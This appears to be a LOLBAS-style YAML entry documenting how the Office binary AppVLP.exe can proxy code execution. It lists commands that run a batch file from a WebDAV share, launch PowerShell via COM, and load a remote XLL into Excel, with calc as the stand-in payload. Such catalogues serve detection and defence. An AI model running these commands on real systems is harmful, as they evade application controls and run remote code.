---
name: appvlp.exe
description: 
functions:
  execute:
    - description: Executes calc.bat through AppVLP.exe
      code: AppVLP.exe \\webdav\calc.bat
    - description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
      code: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
    - description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
      code: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
resources: 
    - resource: https://github.com/MoooKitty/Code-Execution
    - resource: https://twitter.com/moo_hax/status/892388990686347264
fullpath: 
    - path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
    - path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
notes: Thanks to fab - @0rbz_ (No record), Will - @moo_hax (Code Execution)
---